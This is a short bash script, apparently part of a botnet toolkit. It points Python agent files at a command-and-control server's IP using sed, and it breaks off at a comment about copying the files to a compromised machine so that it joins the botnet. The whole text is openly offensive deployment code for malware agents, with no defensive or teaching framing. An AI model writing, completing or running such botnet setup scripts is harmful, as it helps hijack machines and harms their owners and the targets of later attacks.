#! /bin/bash

# Set up the agent files with the IP of the C&C server
echo "Configuring agents..."
sleep 1
cd /agent/python/ && sed -i "s/localhost/$IP/g" settings.py
echo ""
echo ""

# Secure Copy the files over to the compromised machine in order for it to
# join the botnet
